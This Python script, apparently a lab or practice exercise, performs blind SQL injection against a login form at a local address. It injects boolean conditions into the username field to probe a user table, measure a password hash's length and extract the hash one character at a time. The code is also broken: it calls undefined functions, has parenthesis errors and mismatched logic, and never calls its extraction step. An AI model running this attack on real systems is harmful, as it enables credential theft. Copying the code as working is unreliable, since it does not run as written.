import requests

total_queries = 0 
#extracting hash sums 
charset = "0123456789abcdefghijklmnopqrstuvwxyz"
#target IP 
target = "127.0.0.1:5000"
#track where we are in the process
needle = "welcome back"

#define injection fuction 
# it takes a payload to the target end point to input the vul SQL 
#blind injection uses a needle to know if the request work or not 
def injected_query(payload):
  global total_queries
  r = requests.post(target, data={"username" : "admin' and {} --".format(payload), "password" : "password"})
  total_queries += 1
  return needle.encode() not in r.content


#function to create boolean query 
def boolean_query(offset, user_id, character, operator=">"):
  #payload is selecting a text substring password 
  payload = "(select hex(substr(password, {}, 1)) from user where id = {}) {} hex ('{}')".format(offset+1, user_id, operator, character)
  #send payload to injection function 
  return injected_query(payload)


#is the user valid? 
def invalid_user(user_id):
  payload = "(select id from user where id = {}) >= 0".format(user_id) 
  return injected_payload(payload) 

#length of user password hash 
#incrementing over how long the hash is
#guess until it's false 
def password_len(user_id):
  i = 0 
  while True: 
    payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i) 
    #start injection and increment guess until it's false
    #the length is minus one 
    if not injection_query(payload):
      return i 
    i += 1


#if user is valid and password hash is present, let's extract the hash
#iterating through characters in password_length to find the true character
def extract_hash(charset, user_id, password_len):
  found = ""
  for i in range(0, password_len):
    for j in range(len(charset)):
      if boolean_query(i, user_id, charset[j])):
        found += charset[j]
        break
  return found 



#how many queries taken 
def total_queries_taken():
  global total_queries
  print("\t\t [!] {} total queries".format(total_queries)) 
  #once printed reset the var
  total_queries = 0 



while True:
  try:
    user_id = input("> Enter a User ID to extract a password hash:  ")
    if not invalid_user(user_id):
      user_password_len = password_len(user_id)
      print("\t[-] User {} hash length: {}".format(user_id, user_password_len))
      total_queries_taken()
    else:
      print("\t\t [X] User {} does not exist".format(user_id) 
  except KeyboardInterrupt: 
    break 
            
      


  

  
